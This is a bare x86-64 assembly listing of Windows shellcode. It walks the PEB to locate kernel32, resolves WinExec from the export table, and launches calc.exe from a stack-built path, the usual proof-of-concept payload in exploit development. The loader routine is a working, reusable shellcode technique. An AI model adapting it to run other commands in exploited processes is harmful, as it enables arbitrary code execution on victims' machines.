BITS 64
SECTION .text
global main

main:
    sub rsp,0x28
    and rsp,0xfffffffffffffff0
    xor rbx, rbx
    mov rax, [gs:rbx+0x60]                      ; TEB address 
    mov rax, [rax + 0x18]                ; PEB address 
    mov rsi, [rax + 0x20]                ; PEB_LDR_DATA  
    lodsq                                       ; ntdll.dll 
    xchg rax, rsi
    lodsq                                       ; kernelbase.dll 
    mov rbx, [rax + 0x20]                ; kernel32.dll 

    xor r8, r8 
    mov r8d, [rbx + 0x3c]               ; pe signature rva 
    mov rdx, r8 
    add rdx, rbx                        ; pe header 
    xor rcx, rcx 
    mov cl, 0x88 
    mov r8d, [rdx + rcx]               ; rva export table 
    add r8, rbx 
    mov rdx, r8                         ; export table 

    xor rsi, rsi 
    mov esi, [rdx + 0x20]               ; name table rva 
    add rsi, rbx                        ; name table 
    xor rcx, rcx 
    mov r9, 0x636578456e695766            ; WinExec
    shr r9, 8
  get_winexec : 
    inc rcx 
    mov eax, [rsi + rcx * 4]            ; name table contains offset of string name functions 
    add rax, rbx 
    cmp QWORD [rax], r9     
    jnz get_winexec 

    xor rsi, rsi
    mov esi, [rdx + 0x24] 
    add rsi, rbx                        ; rva ordinal table 
    mov cx, [rsi + 2 * rcx]             ; position  
    xor rsi, rsi 
    mov esi, [rdx + 0x1c]               ; rva address table 
    add rsi, rbx                        ; address table 
    mov eax, [rsi + rcx * 4]            ; rva address of winexec 
    add rax, rbx                        ; address of winexec  

    xor rcx, rcx 
    mov ecx, 0x6578652e                 ; put string to stack 
    push rcx 
    mov rcx, 0x636c61635c32336d
    push rcx 
    mov rcx, 0x65747379535c7377
    push rcx 
    mov rcx, 0x6f646e69575c3a43 
    push rcx 
    mov rcx, rsp 
    push 9
    pop rdx
    inc rdx  
    sub rsp, 0x30                       ; prepare stack for winexec 
    call rax 







